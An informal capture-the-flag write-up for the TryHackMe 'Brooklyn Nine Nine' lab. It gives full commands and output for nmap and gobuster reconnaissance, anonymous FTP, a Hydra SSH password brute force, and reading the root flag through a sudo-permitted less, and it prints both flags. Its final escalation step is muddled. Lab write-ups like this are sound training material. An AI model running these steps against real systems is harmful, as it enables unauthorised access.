lets use gobuster first 

gobuster dir -u http://10.10.233.42 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt


while using nmap i found some info such ad ftp can be logged in to as anonymous 


\\\\\\\\\\\\\\

┌──(Abad㉿kali)-[~/Desktop/tryhackme/Brooklyn99]
└─$ nmap -sC -sV 10.10.233.42 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-13 23:19 GMT
Nmap scan report for 10.10.233.42
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.132.238
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status



\\\\\\\\\\\\\\\\\\



now after i accessed to it i got a file that i couldnt see its contained , but thanks to the cmnd less i could 


/////////////

local: note_to_jake.txt remote: note_to_jake.txt
ftp: Can't access `note_to_jake.txt': Permission denied
ftp> sudo get note_to_jake.txt
?Invalid command.
ftp> cat note_to_jake.txt
?Invalid command.
ftp> ls
229 Entering Extended Passive Mode (|||44532|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> 
ftp> less note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone
 hacks into the nine nine


ftp> 
\\\\\\\\\\\\\\\\\\\\\\\


since we found a username let try a brute force since the site is running ssh 

and here we found it 

///////


hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.233.42
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-13 23:28:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://10.10.233.42:22/
[22][ssh] host: 10.10.233.42   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-13 23:28:11


///////


in here we found a private key 
jake@brookly_nine_nine:~/.ssh$ ls
id_rsa  id_rsa.pub

but first lets find user.txt

lets use this cmnd :   find / -name user.txt 2>/dev/null


\\\\\

Breakdown:

    find / → Searches for files starting from the root directory (/).
    -name user.txt → Looks for a file named exactly user.txt.
    2>/dev/null → Redirects error messages (stderr) to /dev/null, preventing permission errors from being displayed.
    
    
    ///
    
    
    we found where user.txt is 
    
    jake@brookly_nine_nine:~$ find / -name user.txt 2>/dev/null

     /home/holt/user.txt

here is the first flag 

jake@brookly_nine_nine:~$ cat /home/holt/user.txt
ee11cbb19052e40b07aac0ca060c23ee
jake@brookly_nine_nine:~$ 


now lets see what priviliges this user has 

////////////

jake@brookly_nine_nine:/usr/bin$ sudo -l 
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:/usr/bin$ 


////////
 so he has /usr/bin/less so instead of cat he can use less
 
 
since we have less we can try to use it in the root directory 

/////////////////

jake@brookly_nine_nine:/usr/bin$ less /root/*.txt
/root/*.txt: No such file or directory
jake@brookly_nine_nine:/usr/bin$ less /root/
/root/ is a directory
jake@brookly_nine_nine:/usr/bin$ less /root/root.txt


when we specified root.txt we found it 



-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
/root/root.txt (END)






    
    





